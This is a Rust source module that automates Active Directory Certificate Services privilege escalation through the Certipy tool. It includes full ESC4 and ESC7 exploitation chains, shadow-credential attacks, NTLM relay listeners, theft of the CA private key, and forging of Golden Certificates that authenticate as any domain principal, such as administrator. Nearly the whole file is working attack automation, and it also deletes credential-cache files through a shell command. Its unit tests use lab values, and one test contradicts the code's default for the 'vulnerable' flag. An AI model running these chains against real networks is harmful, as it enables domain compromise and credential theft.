//! ADCS / Certipy privilege escalation tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_bool, optional_str, required_str};
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Enumerate ADCS certificate templates and CAs using Certipy.
///
/// Required args: `username`, `domain`, `dc_ip`
/// Optional args: `password`, `hashes`, `vulnerable`
pub async fn certipy_find(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let vulnerable = optional_bool(args, "vulnerable").unwrap_or(true);
    let hashes = optional_str(args, "hashes");

    let user_at_domain = format!("{username}@{domain}");

    let mut cmd = CommandBuilder::new("certipy")
        .arg("find")
        .flag("-u", &user_at_domain)
        .flag("-dc-ip", dc_ip)
        .arg("-text")
        .arg("-stdout")
        .arg_if(vulnerable, "-vulnerable")
        .timeout_secs(120);

    if let Some(h) = hashes {
        cmd = cmd.flag("-hashes", h);
    } else {
        let password = required_str(args, "password")?;
        cmd = cmd.flag("-p", password);
    }

    cmd.execute().await
}

/// Request a certificate from an ADCS CA using Certipy.
///
/// Required args: `username`, `domain`, `password`, `ca`, `template`, `dc_ip`
/// Optional args: `upn`, `target` (CA server IP/hostname — use when CA is not on the DC),
///   `sid` (SID to embed in cert), `out` (output PFX filename)
pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let ca = required_str(args, "ca")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let upn = optional_str(args, "upn");
    let sid = optional_str(args, "sid");
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));
    let application_policies = optional_str(args, "application_policies");

    // Generate a unique output filename to avoid certipy's interactive overwrite
    // prompt which kills non-interactive runs. Use template + epoch millis.
    let out = match optional_str(args, "out") {
        Some(o) => o.to_string(),
        None => {
            let ts = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_millis())
                .unwrap_or(0);
            format!("cert_{template}_{ts}")
        }
    };

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .flag("-out", out)
        .flag_opt("-target", target)
        .flag_opt("-upn", upn)
        .flag_opt("-sid", sid)
        .flag_opt("-application-policies", application_policies)
        .timeout_secs(120)
        .execute()
        .await
}

/// Authenticate with a PFX certificate using Certipy.
///
/// Required args: `pfx_path`, `dc_ip`, `domain`
pub async fn certipy_auth(args: &Value) -> Result<ToolOutput> {
    let pfx_path = required_str(args, "pfx_path")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let domain = required_str(args, "domain")?;

    // Certipy auth writes .ccache based on cert subject (e.g. administrator.ccache)
    // and does NOT support -out. Remove existing .ccache files to prevent the
    // interactive "Overwrite? (y/n)" prompt that kills non-interactive runs.
    let _ = tokio::process::Command::new("sh")
        .arg("-c")
        .arg("rm -f *.ccache 2>/dev/null")
        .output()
        .await;

    CommandBuilder::new("certipy")
        .arg("auth")
        .flag("-pfx", pfx_path)
        .flag("-dc-ip", dc_ip)
        .flag("-domain", domain)
        .timeout_secs(120)
        .execute()
        .await
}

/// Perform Certipy Shadow Credentials attack (auto mode).
///
/// Required args: `username`, `domain`, `password`, `target`, `dc_ip`
pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let target = required_str(args, "target")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let user_at_domain = format!("{username}@{domain}");

    // Generate unique output name to avoid interactive overwrite prompt
    let out = match optional_str(args, "out") {
        Some(o) => o.to_string(),
        None => {
            let ts = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_millis())
                .unwrap_or(0);
            format!("shadow_{target}_{ts}")
        }
    };

    // certipy shadow auto internally calls certipy auth which writes .ccache
    // based on the target account name. Remove existing .ccache to prevent the
    // interactive "Overwrite? (y/n)" prompt.
    let _ = tokio::process::Command::new("sh")
        .arg("-c")
        .arg("rm -f *.ccache 2>/dev/null")
        .output()
        .await;

    CommandBuilder::new("certipy")
        .arg("shadow")
        .arg("auto")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-account", target)
        .flag("-dc-ip", dc_ip)
        .flag("-out", out)
        .timeout_secs(120)
        .execute()
        .await
}

/// Certipy CA management operations (add-officer, issue-request, backup).
///
/// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`
/// Required: exactly one of:
///   - `add_officer` (bool, true)
///   - `issue_request` (integer request ID)
///   - `backup` (bool, true) — exports the CA private key to `<ca>.pfx` in CWD.
///     Requires SYSTEM-equivalent access on the CA host (e.g., the calling
///     process is running on a host where `username` is local administrator).
pub async fn certipy_ca(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let ca = required_str(args, "ca")?;

    let user_at_domain = format!("{username}@{domain}");

    let add_officer = optional_bool(args, "add_officer").unwrap_or(false);
    let backup = optional_bool(args, "backup").unwrap_or(false);
    let issue_request = args
        .get("issue_request")
        .and_then(|v| v.as_i64())
        .map(|v| v as i32);

    let mut cmd = CommandBuilder::new("certipy")
        .arg("ca")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-dc-ip", dc_ip)
        .flag("-ca", ca)
        .timeout_secs(180);

    if add_officer {
        cmd = cmd.flag("-add-officer", format!("{username}@{domain}"));
    }
    if let Some(req_id) = issue_request {
        cmd = cmd.flag("-issue-request", req_id.to_string());
    }
    if backup {
        cmd = cmd.arg("-backup");
    }

    cmd.execute().await
}

/// Forge a "Golden Certificate" from a stolen CA PFX (the `-backup` output of
/// `certipy_ca`). Produces a client PFX that authenticates as `upn` on the CA's
/// domain — the universal terminal node for ADCS compromise: any path that
/// gets SYSTEM on a CA host can chain `certipy_ca backup` → this tool →
/// `certipy_auth` to obtain a TGT/NT hash for any principal in the domain.
///
/// Required args: `ca_pfx` (path to stolen CA PFX), `upn` (target principal,
///                e.g. `administrator@essos.local`)
/// Optional args: `subject`, `template`, `out` (output PFX path)
pub async fn certipy_forge(args: &Value) -> Result<ToolOutput> {
    let ca_pfx = required_str(args, "ca_pfx")?;
    let upn = required_str(args, "upn")?;
    let subject = optional_str(args, "subject");
    let template = optional_str(args, "template");

    let out = match optional_str(args, "out") {
        Some(o) => o.to_string(),
        None => {
            let ts = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_millis())
                .unwrap_or(0);
            let safe_upn = upn.replace(['/', '\\', ' '], "_");
            format!("forged_{safe_upn}_{ts}.pfx")
        }
    };

    CommandBuilder::new("certipy")
        .arg("forge")
        .flag("-ca-pfx", ca_pfx)
        .flag("-upn", upn)
        .flag_opt("-subject", subject)
        .flag_opt("-template", template)
        .flag("-out", out)
        .timeout_secs(60)
        .execute()
        .await
}

/// Retrieve a previously issued certificate by request ID.
///
/// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`,
///                `request_id`
/// Optional args: `target` (CA server IP)
pub async fn certipy_retrieve(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let ca = required_str(args, "ca")?;
    let request_id =
        args.get("request_id")
            .and_then(|v| v.as_i64())
            .ok_or_else(|| anyhow::anyhow!("missing required arg: request_id"))? as i32;
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));

    let user_at_domain = format!("{username}@{domain}");

    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let out = format!("cert_retrieve_{request_id}_{ts}");

    CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-retrieve", request_id.to_string())
        .flag("-dc-ip", dc_ip)
        .flag("-out", out)
        .flag_opt("-target", target)
        .timeout_secs(120)
        .execute()
        .await
}

/// Run the full ESC7 exploitation chain: add officer → request SubCA cert
/// (gets denied) → issue the pending request → retrieve cert → authenticate.
///
/// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`
/// Optional args: `target` (CA server IP), `upn`, `sid`
pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let ca = required_str(args, "ca")?;
    let upn = optional_str(args, "upn")
        .unwrap_or("administrator")
        .to_string();
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));
    let sid = optional_str(args, "sid");

    let upn_full = if upn.contains('@') {
        upn.clone()
    } else {
        format!("{upn}@{domain}")
    };

    let user_at_domain = format!("{username}@{domain}");
    let mut outputs = Vec::new();

    // Step 1: Add self as CA officer (certipy v5 requires principal as arg)
    let mut step1_cmd = CommandBuilder::new("certipy")
        .arg("ca")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-dc-ip", dc_ip)
        .flag("-ca", ca)
        .flag("-add-officer", username);
    if let Some(t) = &target {
        step1_cmd = step1_cmd.flag("-target", *t);
    }
    let step1 = step1_cmd.timeout_secs(120).execute().await?;
    outputs.push(("Add Officer", step1));

    // Step 2: Request cert with SubCA template (will be denied/pending)
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let out_name = format!("cert_esc7_{ts}");

    let mut req_cmd = CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", "SubCA")
        .flag("-upn", &upn_full)
        .flag("-dc-ip", dc_ip)
        .flag("-out", &out_name);
    if let Some(t) = &target {
        req_cmd = req_cmd.flag("-target", *t);
    }
    if let Some(s) = &sid {
        req_cmd = req_cmd.flag("-sid", *s);
    }
    // Certipy asks "Would you like to save the private key? (y/N)" when the
    // SubCA request is denied — we need to answer "y" to keep the key for later.
    let step2 = req_cmd.stdin("y\n").timeout_secs(120).execute().await?;

    // Parse the request ID from certipy output (e.g., "Request ID is 42")
    let request_id = step2
        .stdout
        .lines()
        .chain(step2.stderr.lines())
        .find_map(|line| {
            let lower = line.to_lowercase();
            if lower.contains("request id") {
                line.split_whitespace()
                    .filter_map(|w| w.trim_end_matches('.').parse::<i32>().ok())
                    .next_back()
            } else {
                None
            }
        });
    outputs.push(("Request SubCA", step2));

    let req_id = match request_id {
        Some(id) => id,
        None => {
            let combined = outputs
                .iter()
                .map(|(name, o)| format!("=== {name} ===\n{}\n{}", o.stdout, o.stderr))
                .collect::<Vec<_>>()
                .join("\n");
            return Ok(ToolOutput {
                stdout: combined,
                stderr: "ERROR: Could not parse request ID from certipy output".into(),
                exit_code: Some(1),
                success: false,
            });
        }
    };

    // Step 3: Issue the pending request using ManageCA rights
    let mut step3_cmd = CommandBuilder::new("certipy")
        .arg("ca")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-dc-ip", dc_ip)
        .flag("-ca", ca)
        .flag("-issue-request", req_id.to_string());
    if let Some(t) = &target {
        step3_cmd = step3_cmd.flag("-target", *t);
    }
    let step3 = step3_cmd.timeout_secs(120).execute().await?;
    outputs.push(("Issue Request", step3));

    // Step 4: Retrieve the issued certificate
    let step4 = CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-retrieve", req_id.to_string())
        .flag("-dc-ip", dc_ip)
        .flag("-out", &out_name);
    let mut step4 = step4;
    if let Some(t) = &target {
        step4 = step4.flag("-target", *t);
    }
    let step4_out = step4.timeout_secs(120).execute().await?;
    outputs.push(("Retrieve Cert", step4_out));

    // Step 4b: If certipy couldn't create a PFX (key mismatch), combine manually
    let pfx_path = format!("{out_name}.pfx");
    let crt_path = format!("{out_name}.crt");
    let key_path = format!("{out_name}.key");
    if !tokio::fs::try_exists(&pfx_path).await.unwrap_or(false)
        && tokio::fs::try_exists(&crt_path).await.unwrap_or(false)
        && tokio::fs::try_exists(&key_path).await.unwrap_or(false)
    {
        let combine = CommandBuilder::new("openssl")
            .arg("pkcs12")
            .flag("-in", &crt_path)
            .flag("-inkey", &key_path)
            .arg("-export")
            .flag("-out", &pfx_path)
            .flag("-passout", "pass:")
            .timeout_secs(30)
            .execute()
            .await?;
        outputs.push(("Combine PFX", combine));
    }

    // Step 5: Authenticate with the retrieved PFX
    let _ = tokio::process::Command::new("sh")
        .arg("-c")
        .arg("rm -f *.ccache 2>/dev/null")
        .output()
        .await;

    let step5 = CommandBuilder::new("certipy")
        .arg("auth")
        .flag("-pfx", &pfx_path)
        .flag("-dc-ip", dc_ip)
        .flag("-domain", domain)
        .timeout_secs(120)
        .execute()
        .await?;
    let auth_success = step5.success;
    outputs.push(("Authenticate", step5));

    let combined_stdout = outputs
        .iter()
        .map(|(name, o)| format!("=== Step: {name} ===\n{}", o.stdout))
        .collect::<Vec<_>>()
        .join("\n");
    let combined_stderr = outputs
        .iter()
        .map(|(name, o)| format!("=== Step: {name} ===\n{}", o.stderr))
        .collect::<Vec<_>>()
        .join("\n");

    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code: if auth_success { Some(0) } else { Some(1) },
        success: auth_success,
    })
}

/// Start a Certipy relay listener for ESC8 (HTTP) or ESC11 (RPC) attacks.
///
/// Required args: `target`, `ca`
/// Optional args: `template`
///
/// For ESC8:  `certipy relay -target http://ca-host -ca CA-NAME`
/// For ESC11: `certipy relay -target rpc://ca-host -ca CA-NAME`
pub async fn certipy_relay(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let ca = required_str(args, "ca")?;
    let template = optional_str(args, "template");

    CommandBuilder::new("certipy")
        .arg("relay")
        .flag("-target", target)
        .flag("-ca", ca)
        .flag_opt("-template", template)
        .timeout_secs(300)
        .execute()
        .await
}

/// Modify a certificate template for ESC4 exploitation using Certipy.
///
/// Required args: `username`, `domain`, `password`, `template`, `dc_ip`
pub async fn certipy_template_esc4(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("template")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .arg("-save-old")
        .timeout_secs(120)
        .execute()
        .await
}

/// Run the full ESC4 exploitation chain: template modification -> cert
/// request -> authentication.
///
/// Required args: `username`, `domain`, `password`, `template`, `dc_ip`,
///                `ca`
/// Optional args: `upn`, `target`, `sid`
pub async fn certipy_esc4_full_chain(args: &Value) -> Result<ToolOutput> {
    let template_output = certipy_template_esc4(args).await?;

    // Generate a unique output name for the PFX and inject into args
    let template = args
        .get("template")
        .and_then(|v| v.as_str())
        .unwrap_or("esc4");
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let out_name = format!("cert_{template}_{ts}");
    let pfx_path = format!("{out_name}.pfx");

    let mut req_args = args.clone();
    if let Some(obj) = req_args.as_object_mut() {
        obj.insert("out".into(), serde_json::json!(out_name));
    }
    let request_output = certipy_request(&req_args).await?;

    let mut auth_args = args.clone();
    if let Some(obj) = auth_args.as_object_mut() {
        obj.insert("pfx_path".into(), serde_json::json!(pfx_path));
    }
    let auth_output = certipy_auth(&auth_args).await?;

    let combined_stdout = format!(
        "=== Step 1: Template Modification ===\n{}\n\
         === Step 2: Certificate Request ===\n{}\n\
         === Step 3: Authentication ===\n{}",
        template_output.stdout, request_output.stdout, auth_output.stdout
    );
    let combined_stderr = format!(
        "=== Step 1: Template Modification ===\n{}\n\
         === Step 2: Certificate Request ===\n{}\n\
         === Step 3: Authentication ===\n{}",
        template_output.stderr, request_output.stderr, auth_output.stderr
    );

    // The chain succeeds only if the final auth step succeeded.
    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code: auth_output.exit_code,
        success: template_output.success && request_output.success && auth_output.success,
    })
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_bool, optional_str, required_str};
    use serde_json::json;

    // --- certipy_find ---

    #[test]
    fn certipy_find_missing_username() {
        let args = json!({
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn certipy_find_missing_domain() {
        let args = json!({
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn certipy_find_missing_password() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "password").is_err());
    }

    #[test]
    fn certipy_find_missing_dc_ip() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn certipy_find_user_at_domain_format() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "admin@contoso.local");
    }

    #[test]
    fn certipy_find_vulnerable_default_false() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let vulnerable = optional_bool(&args, "vulnerable").unwrap_or(false);
        assert!(!vulnerable);
    }

    #[test]
    fn certipy_find_vulnerable_set_true() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "vulnerable": true
        });
        let vulnerable = optional_bool(&args, "vulnerable").unwrap_or(false);
        assert!(vulnerable);
    }

    // --- certipy_request ---

    #[test]
    fn certipy_request_missing_ca() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "template": "ESC1",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "ca").is_err());
    }

    #[test]
    fn certipy_request_missing_template() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-DC01-CA",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "template").is_err());
    }

    #[test]
    fn certipy_request_user_at_domain_format() {
        let args = json!({
            "username": "lowpriv",
            "domain": "contoso.local",
            "password": "Secret123",
            "ca": "corp-CA",
            "template": "VulnTemplate",
            "dc_ip": "192.168.58.1"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "lowpriv@contoso.local");
    }

    #[test]
    fn certipy_request_upn_present() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-DC01-CA",
            "template": "ESC1",
            "dc_ip": "192.168.58.10",
            "upn": "administrator@contoso.local"
        });
        assert_eq!(
            optional_str(&args, "upn"),
            Some("administrator@contoso.local")
        );
    }

    #[test]
    fn certipy_request_upn_absent() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-DC01-CA",
            "template": "ESC1",
            "dc_ip": "192.168.58.10"
        });
        assert!(optional_str(&args, "upn").is_none());
    }

    // --- certipy_auth ---

    #[test]
    fn certipy_auth_missing_pfx_path() {
        let args = json!({
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "pfx_path").is_err());
    }

    #[test]
    fn certipy_auth_missing_dc_ip() {
        let args = json!({
            "pfx_path": "/tmp/admin.pfx",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn certipy_auth_missing_domain() {
        let args = json!({
            "pfx_path": "/tmp/admin.pfx",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn certipy_auth_all_args() {
        let args = json!({
            "pfx_path": "/tmp/admin.pfx",
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        assert_eq!(required_str(&args, "pfx_path").unwrap(), "/tmp/admin.pfx");
        assert_eq!(required_str(&args, "dc_ip").unwrap(), "192.168.58.10");
        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
    }

    // --- certipy_shadow ---

    #[test]
    fn certipy_shadow_missing_target() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "target").is_err());
    }

    #[test]
    fn certipy_shadow_user_at_domain_format() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "target": "dc01$",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "admin@contoso.local");
    }

    // --- certipy_template_esc4 ---

    #[test]
    fn certipy_template_esc4_missing_template() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "template").is_err());
    }

    #[test]
    fn certipy_template_esc4_user_at_domain_format() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "template": "ESC4Template",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "admin@contoso.local");
    }

    // --- mock executor tests ---

    use crate::executor::mock;

    #[tokio::test]
    async fn certipy_find_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_find(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_find_vulnerable_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "dc_ip": "192.168.58.1", "vulnerable": true
        });
        assert!(super::certipy_find(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_request_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "ca": "contoso-CA", "template": "ESC1",
            "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_request(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_request_with_upn_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "ca": "contoso-CA", "template": "ESC1",
            "dc_ip": "192.168.58.1", "upn": "administrator@contoso.local"
        });
        assert!(super::certipy_request(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_auth_executes() {
        mock::push(mock::success());
        let args = json!({
            "pfx_path": "/tmp/admin.pfx", "dc_ip": "192.168.58.1",
            "domain": "contoso.local"
        });
        assert!(super::certipy_auth(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_shadow_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "target": "dc01$", "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_shadow(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_template_esc4_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "template": "ESC4", "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_template_esc4(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_relay_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "rpc://192.168.58.10", "ca": "contoso-CA"
        });
        assert!(super::certipy_relay(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_request_with_application_policies_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "ca": "contoso-CA", "template": "ESC15",
            "dc_ip": "192.168.58.1",
            "application_policies": "1.3.6.1.5.5.7.3.2"
        });
        assert!(super::certipy_request(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_esc4_full_chain_executes() {
        // 3 execute calls: template, request, auth
        mock::push(mock::success());
        mock::push(mock::success());
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "template": "ESC4", "dc_ip": "192.168.58.1",
            "ca": "contoso-CA", "pfx_path": "/tmp/admin.pfx"
        });
        assert!(super::certipy_esc4_full_chain(&args).await.is_ok());
    }
}
